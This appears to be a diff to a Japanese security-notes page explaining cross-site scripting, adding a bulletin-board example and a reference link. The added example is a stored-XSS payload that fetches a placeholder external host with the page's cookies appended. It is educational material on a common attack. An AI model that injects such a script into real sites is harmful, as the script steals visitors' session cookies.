@@ -22909,8 +22909,16 @@
 <p>悪意のある第三者が正常なサイトに事前にスクリプトを埋め込み、これを実行してしまったユーザーの情報を盗む。</p>
 <p><img alt="cross-cite-scripting" src="https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/cross-cite-scripting.png" /></p>
 <h4 id="_6">▼ 攻撃例<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<p>例えば、複数人が使用する掲示板アプリで、悪意のある人が以下のような投稿をしたとする。</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+<span class="w">    </span><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">今日の気分は</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://&lt;Cookieの送信先サイト&gt;/?cookie_data=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookies</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;だよ&lt;/p&gt;</span>
+<span class="o">&lt;</span><span class="err">/body&gt;</span>
+</code></pre></div>
+<p>他の人が掲示板アプリを開くと、上記の投稿内のスクリプトが実行される。</p>
+<p>スクリプトは、Cookieをサイトに送信する。</p>
 <blockquote>
 <ul>
+<li><a href="https://zenn.dev/oreo2990/articles/d33a264b2d8b4c">https://zenn.dev/oreo2990/articles/d33a264b2d8b4c</a></li>
 <li><a href="https://www.tohoho-web.com/ex/xss.html">https://www.tohoho-web.com/ex/xss.html</a></li>
 </ul>
 </blockquote>
@@ -22974,7 +22982,7 @@
     <span class="md-icon" title="最終更新日">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-04-22</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-04-23</span>
   </span>
 
     
